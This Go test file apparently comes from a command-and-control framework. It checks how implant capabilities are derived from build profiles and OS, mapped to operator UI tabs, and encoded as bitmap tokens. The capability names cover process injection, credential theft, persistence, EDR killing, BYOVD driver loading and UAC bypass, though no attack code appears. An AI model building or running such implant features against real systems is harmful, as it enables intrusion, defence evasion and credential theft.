package features

import (
	"reflect"
	"strings"
	"testing"
)

// TestBitTableIsAppendOnlyAndUnique 位序是**已交付载荷的 ABI**：复用/重排会让老载荷
// 解出错误能力。这里钉住 v1 的既有顺序（前 32 位），并检查无重复、未超容量。
func TestBitTableIsAppendOnlyAndUnique(t *testing.T) {
	if len(bitNames) > maxBits {
		t.Fatalf("能力位数 %d 超过位图容量 %d", len(bitNames), maxBits)
	}
	// v1.4.0 S4 冻结的 32 位顺序（只允许在尾部追加，不允许改动这里的前 32 项）。
	frozen := []string{
		"command", "file_list", "file_download", "file_upload", "file_delete",
		"process_list", "process_kill", "shell", "sysinfo", "netstat",
		"relay",
		"process_inject", "process_spoof", "auto_inject", "injection", "spawn",
		"fileless_exec", "persistence", "credentials", "screenshot", "screen_stream",
		"av_detect", "edr_blind", "edr_kill", "byovd_load", "byovd_unload", "ppl_kill",
		"privesc_uac", "bof_load", "plugin_exe", "plugin_dll", "plugin_shellcode",
	}
	if len(bitNames) < len(frozen) {
		t.Fatalf("能力位少了：got %d, want >= %d", len(bitNames), len(frozen))
	}
	for i, want := range frozen {
		if bitNames[i] != want {
			t.Errorf("位序 %d 被改动了：got %q, want %q（位序是 ABI，只能在尾部追加）", i, bitNames[i], want)
		}
	}
	seen := map[string]bool{}
	for i, n := range bitNames {
		if seen[n] {
			t.Errorf("能力名重复：%q（位序 %d）", n, i)
		}
		seen[n] = true
	}
}

// TestDerive 表驱动核对"构建规格 → 能力集合"。期望值是逐个核对模板 //go:build 后的
// 事实（见 Derive 的行内注释与 v1.4.0 S4 报告的 tag↔能力对照表），不是照抄旧实现。
func TestDerive(t *testing.T) {
	base := []string{
		FeatureCommand, FeatureFileList, FeatureFileDownload, FeatureFileUpload, FeatureFileDelete,
		FeatureProcessList, FeatureProcessKill, FeatureShell, FeatureSysinfo, FeatureNetstat,
	}
	// 期望值按**位序**书写（Derive 的输出顺序就是位序），便于与 Derive 的
	// ordered() 直接 diff。
	winFull := append(append([]string{}, base...),
		FeatureRelay,
		FeatureProcessInject, FeatureProcessSpoof, FeatureAutoInject, FeatureInjection, FeatureSpawn,
		FeatureFilelessExec, FeaturePersistence, FeatureCredentials, FeatureScreenshot, FeatureScreenStream,
		FeatureAVDetect, FeatureEDRBlind, FeatureEDRKill, FeatureByovdLoad, FeatureByovdUnload, FeaturePPLKill,
		FeaturePrivescUAC, FeaturePluginEXE, FeaturePluginDLL, FeaturePluginShellcode,
	)
	// bof_load 的位序在 privesc_uac 之后、plugin_exe 之前，因此不能简单 append 到末尾。
	winFullBOF := append(append([]string{}, base...),
		FeatureRelay,
		FeatureProcessInject, FeatureProcessSpoof, FeatureAutoInject, FeatureInjection, FeatureSpawn,
		FeatureFilelessExec, FeaturePersistence, FeatureCredentials, FeatureScreenshot, FeatureScreenStream,
		FeatureAVDetect, FeatureEDRBlind, FeatureEDRKill, FeatureByovdLoad, FeatureByovdUnload, FeaturePPLKill,
		FeaturePrivescUAC, FeatureBOFLoad, FeaturePluginEXE, FeaturePluginDLL, FeaturePluginShellcode,
	)

	cases := []struct {
		name string
		in   Input
		want []string
	}{
		{
			name: "windows full（默认不勾 BOF=没有 Beacon API 面）",
			in:   Input{Profile: "full", OS: "windows", Arch: "amd64", Transport: "tcp"},
			want: winFull,
		},
		{
			name: "windows full + BOF",
			in:   Input{Profile: "full", OS: "windows", Arch: "amd64", BOF: true},
			want: winFullBOF,
		},
		{
			name: "windows full（空档案 = 默认 full，与 buildTagList 一致）",
			in:   Input{Profile: "", OS: "windows", Arch: "amd64"},
			want: winFull,
		},
		{
			name: "windows light（只剩基础能力 + 杀软识别；注入/截图/凭据/EDR/BOF/中继全没了）",
			in:   Input{Profile: "light", OS: "windows", Arch: "amd64", BOF: true},
			want: append(append([]string{}, base...), FeatureAVDetect),
		},
		{
			name: "windows 未知档案 fail-closed（按 light 算，构建侧也会被压成 light）",
			in:   Input{Profile: "nano", OS: "windows", Arch: "amd64", BOF: true},
			want: append(append([]string{}, base...), FeatureAVDetect),
		},
		{
			name: "linux full（插件只有 plugin_exe 是真实现；BOF/DLL/shellcode/内存执行全是 Windows-only stub）",
			in:   Input{Profile: "full", OS: "linux", Arch: "amd64"},
			want: append(append([]string{}, base...), FeatureRelay, FeaturePluginEXE),
		},
		{
			name: "linux light（连 plugin_exe 都没有：plugin_unix.go 带 !light）",
			in:   Input{Profile: "light", OS: "linux", Arch: "amd64"},
			want: base,
		},
		{
			name: "darwin full（同 unix 口径）",
			in:   Input{Profile: "full", OS: "darwin", Arch: "arm64"},
			want: append(append([]string{}, base...), FeatureRelay, FeaturePluginEXE),
		},
		{
			name: "未知 OS 不 panic：只点亮跨平台基础能力 + 进程管理 + 非 light 的中继",
			in:   Input{Profile: "full", OS: "plan9", Arch: "amd64"},
			want: append(append([]string{}, base...), FeatureRelay),
		},
		{
			name: "OS 为空视为未知（fail-closed，不猜 windows）",
			in:   Input{Profile: "full", OS: ""},
			want: append(append([]string{}, base...), FeatureRelay),
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := Derive(c.in)
			if !reflect.DeepEqual(got, c.want) {
				t.Errorf("Derive(%+v)\n got = %v\nwant = %v", c.in, got, c.want)
			}
			// 未知/任意输入都不能 panic，也不能出现未知键。
			for _, f := range got {
				if bitIndex(f) < 0 {
					t.Errorf("推导出未登记的能力名 %q", f)
				}
			}
		})
	}
}

// TestDeriveLightHasNoHeavyCapabilities light 档**绝不能**包含注入/凭据/截图/EDR/BOF/中继
// —— 这些文件都带 `windows && !light`，编不进去，界面就不该有按钮（本项要修的核心问题）。
func TestDeriveLightHasNoHeavyCapabilities(t *testing.T) {
	forbidden := []string{
		FeatureProcessInject, FeatureProcessSpoof, FeatureAutoInject, FeatureInjection, FeatureSpawn,
		FeaturePersistence, FeatureCredentials, FeatureScreenshot, FeatureScreenStream,
		FeatureEDRBlind, FeatureEDRKill, FeatureByovdLoad, FeatureByovdUnload, FeaturePPLKill,
		FeaturePrivescUAC, FeatureBOFLoad, FeaturePluginEXE, FeaturePluginDLL, FeaturePluginShellcode,
		FeatureFilelessExec, FeatureRelay,
	}
	for _, osName := range []string{"windows", "linux", "darwin"} {
		got := Derive(Input{Profile: "light", OS: osName, BOF: true})
		for _, bad := range forbidden {
			for _, f := range got {
				if f == bad {
					t.Errorf("light/%s 不该点亮 %q（对应实现文件带 !light，载荷里没有）", osName, bad)
				}
			}
		}
	}
}

// TestTabs light 档的 tabs 必须明显少于 full，且不含 bof/injection；
// tabs 一律由能力集合推导，不允许出现"没有能力却点亮面板"的组合。
func TestTabs(t *testing.T) {
	light := Tabs(Derive(Input{Profile: "light", OS: "windows", BOF: true}))
	full := Tabs(Derive(Input{Profile: "full", OS: "windows", BOF: true}))

	if light[TabInjection] || light[TabBOF] || light[TabFileless] || light[TabScreenStream] ||
		light[TabPersistence] || light[TabCredentials] || light[TabScreenshot] || light[TabRelay] {
		t.Errorf("light 档不应有点了没反应的面板：%v", light)
	}
	for _, must := range []string{TabInfo, TabFiles, TabProcess, TabShell, TabAV} {
		if !light[must] {
			t.Errorf("light 档缺少可用面板 %q：%v", must, light)
		}
	}
	if len(light) >= len(full) {
		t.Errorf("light 的面板数 %d 应明显少于 full 的 %d", len(light), len(full))
	}
	for _, must := range []string{TabInjection, TabBOF, TabFileless, TabScreenStream, TabPersistence, TabCredentials, TabScreenshot} {
		if !full[must] {
			t.Errorf("full 档缺少面板 %q：%v", must, full)
		}
	}
	// tabs 里不能出现值为 false 的键（前端按 === true 判断，但脏数据会给排查添堵）。
	for k, v := range light {
		if !v {
			t.Errorf("tabs 不该包含值为 false 的键：%q", k)
		}
	}
	// 不存在的面板键不得出现。
	for k := range full {
		found := false
		for _, tf := range tabFeatures {
			if tf.Tab == k {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("推导出未登记的 tabs 键：%q", k)
		}
	}
}

// TestBitmapRoundTrip 位图/令牌编解码必须自洽，且位序稳定。
func TestBitmapRoundTrip(t *testing.T) {
	cases := []Input{
		{Profile: "full", OS: "windows", Arch: "amd64", BOF: true},
		{Profile: "light", OS: "windows"},
		{Profile: "full", OS: "linux"},
		{Profile: "light", OS: "linux"},
		{Profile: "nano", OS: "windows"},
		{Profile: "full", OS: "plan9"},
	}
	for _, in := range cases {
		features := Derive(in)
		token := EncodeToken(in)
		mask, ok := ParseToken(token)
		if !ok {
			t.Fatalf("ParseToken(%q) 失败（in=%+v）", token, in)
		}
		if mask != Bitmask(features) {
			t.Errorf("位图不一致：token=%s mask=%016x want=%016x", token, mask, Bitmask(features))
		}
		if got := Decode(mask); !reflect.DeepEqual(got, features) {
			t.Errorf("Decode 后再 Derive 结果不一致：got=%v want=%v", got, features)
		}
		if !strings.HasPrefix(token, TokenPrefix) {
			t.Errorf("令牌前缀不对：%q", token)
		}
		// 令牌只含 [0-9a-f] 与固定前缀，构建期要能直接写进 Go 源码字面量。
		if strings.ContainsAny(token, `"\\`+"\n") {
			t.Errorf("令牌含会破坏模板注入的字符：%q", token)
		}
	}
}

// TestParseTokenRejectsJunk 解析必须严格：格式不对一律 false（调用方据此兜底），
// 绝不能"差不多就按 0 解"，否则一个坏令牌会把所有面板都关掉（或全开）。
func TestParseTokenRejectsJunk(t *testing.T) {
	bad := []string{
		"", "cap:", "cap:v1:", "cap:v1:0", "cap:v1:000000000000000", "cap:v1:00000000000000000",
		"cap:v2:0000000000000001", "cap:v1:zzzzzzzzzzzzzzzz", "CAP:V1:0000000000000001",
		"0000000000000001", "bof_load",
	}
	for _, s := range bad {
		if _, ok := ParseToken(s); ok {
			t.Errorf("ParseToken(%q) 应为 false", s)
		}
	}
	if mask, ok := ParseToken("cap:v1:0000000000000001"); !ok || mask != 1 {
		t.Errorf("合法令牌解析失败：mask=%x ok=%v", mask, ok)
	}
	if mask, ok := ParseToken("cap:v1:ffffffffffffffff"); !ok || mask != ^uint64(0) {
		t.Errorf("全 1 令牌解析失败：mask=%x ok=%v", mask, ok)
	}
	// 未知高位（比本服务端新的载荷）只忽略，不 panic。
	got := Decode(1 << 63)
	if len(got) != 0 {
		t.Errorf("未知高位不该解出能力：%v", got)
	}
}

// TestOSFallbackFrozen 老载荷兜底口径必须与 v1.4.0 之前的输出**逐字一致**
// （字段名/顺序/内容都不能变），否则老会话现在能用的按钮会消失。
func TestOSFallbackFrozen(t *testing.T) {
	winFeatures := []string{
		"command", "file_list", "file_download", "file_upload", "file_delete",
		"process_list", "process_kill", "shell", "sysinfo", "netstat",
		"process_inject", "process_spoof", "auto_inject", "injection", "spawn",
		"fileless_exec", "persistence", "credentials", "screenshot", "screen_stream",
		"av_detect", "edr_blind", "edr_kill", "byovd_load", "byovd_unload", "ppl_kill",
		"privesc_uac", "bof_load",
		"relay",
	}
	winTabs := map[string]bool{
		"info": true, "files": true, "process": true, "shell": true, "bof": true, "relay": true,
		"injection": true, "persistence": true, "screenshot": true, "credentials": true,
		"av": true, "fileless": true, "screenstream": true,
	}
	unixFeatures := []string{
		"command", "file_list", "file_download", "file_upload", "file_delete",
		"process_list", "process_kill", "shell", "sysinfo", "netstat",
		"fileless_exec", "bof_load", "plugin_exe", "plugin_dll", "plugin_shellcode",
		"relay",
	}
	unixTabs := map[string]bool{
		"info": true, "files": true, "process": true, "shell": true, "bof": true, "relay": true,
		"fileless": true,
	}
	otherFeatures := []string{
		"command", "file_list", "file_download", "file_upload", "file_delete",
		"process_list", "process_kill", "shell", "sysinfo", "netstat",
		"relay",
	}
	otherTabs := map[string]bool{
		"info": true, "files": true, "process": true, "shell": true, "bof": true, "relay": true,
	}

	cases := []struct {
		os       string
		features []string
		tabs     map[string]bool
	}{
		{"Windows 10 x64", winFeatures, winTabs},
		{"windows", winFeatures, winTabs},
		{"Linux 6.1", unixFeatures, unixTabs},
		{"Darwin 23.0", unixFeatures, unixTabs},
		{"Plan9", otherFeatures, otherTabs},
		{"", otherFeatures, otherTabs},
	}
	for _, c := range cases {
		f, tb := OSFallback(c.os)
		if !reflect.DeepEqual(f, c.features) {
			t.Errorf("OSFallback(%q) features\n got = %v\nwant = %v", c.os, f, c.features)
		}
		if !reflect.DeepEqual(tb, c.tabs) {
			t.Errorf("OSFallback(%q) tabs\n got = %v\nwant = %v", c.os, tb, c.tabs)
		}
	}
}

// TestResolve Resolve 是展示层唯一入口：上报优先、老载荷兜底、脏数据不 panic。
func TestResolve(t *testing.T) {
	lightToken := EncodeToken(Input{Profile: "light", OS: "windows", BOF: true})
	fullToken := EncodeToken(Input{Profile: "full", OS: "windows", BOF: true})

	// 1) 上报 light 位图：必须**不**按 OS 兜底（否则又回到"light 载荷显示注入面板"）。
	f, tabs, src := Resolve([]string{lightToken}, "Windows 11")
	if src != SourceReported {
		t.Fatalf("source = %q, want %q", src, SourceReported)
	}
	if tabs[TabInjection] || tabs[TabBOF] || tabs[TabFileless] {
		t.Errorf("按上报位图（light）不该有注入/插件/内存面板：%v", tabs)
	}
	if !tabs[TabAV] || !tabs[TabInfo] {
		t.Errorf("light 上报里有 av/info：%v", tabs)
	}
	if len(f) >= len(Decode(Bitmask(Derive(Input{Profile: "full", OS: "windows", BOF: true})))) {
		t.Errorf("light 能力数应少于 full：%d", len(f))
	}

	// 2) 上报 full 位图：面板齐全。
	_, tabsFull, srcFull := Resolve([]string{fullToken}, "Windows 11")
	if srcFull != SourceReported || !tabsFull[TabInjection] || !tabsFull[TabBOF] {
		t.Errorf("full 上报应给出注入/插件面板：src=%q tabs=%v", srcFull, tabsFull)
	}

	// 3) 老载荷（Modules 为空）→ OS 兜底，且与冻结口径一致。
	fb, tb, srcFB := Resolve(nil, "windows")
	wantF, wantT := OSFallback("windows")
	if srcFB != SourceOSFallback {
		t.Errorf("source = %q, want %q", srcFB, SourceOSFallback)
	}
	if !reflect.DeepEqual(fb, wantF) || !reflect.DeepEqual(tb, wantT) {
		t.Errorf("兜底结果应与 OSFallback 完全一致")
	}

	// 4) 全 0 位图 = 注入失败/伪造 → 视为未上报（不能显示空面板）。
	if _, _, src0 := Resolve([]string{TokenPrefix + "0000000000000000"}, "windows"); src0 != SourceOSFallback {
		t.Errorf("全 0 位图应回退 OS 推导，got source=%q", src0)
	}

	// 5) 工具/第三方直接上报能力名：只认已知键，忽略垃圾。
	fn, tn, srcN := Resolve([]string{"bof_load", "plugin_exe", "bogus_feature", ""}, "linux")
	if srcN != SourceReported {
		t.Errorf("上报能力名应按 reported 处理，got %q", srcN)
	}
	if !tn[TabBOF] || !reflect.DeepEqual(fn, []string{FeatureBOFLoad, FeaturePluginEXE}) {
		t.Errorf("能力名上报解析错误：features=%v tabs=%v", fn, tn)
	}

	// 6) 完全没有上报且 OS 未知：不 panic，退化为旧口径。
	if _, tabsUnknown, srcU := Resolve(nil, "plan9"); srcU != SourceOSFallback || !tabsUnknown[TabBOF] {
		t.Errorf("未知 OS 兜底应沿用旧口径：src=%q tabs=%v", srcU, tabsUnknown)
	}
}
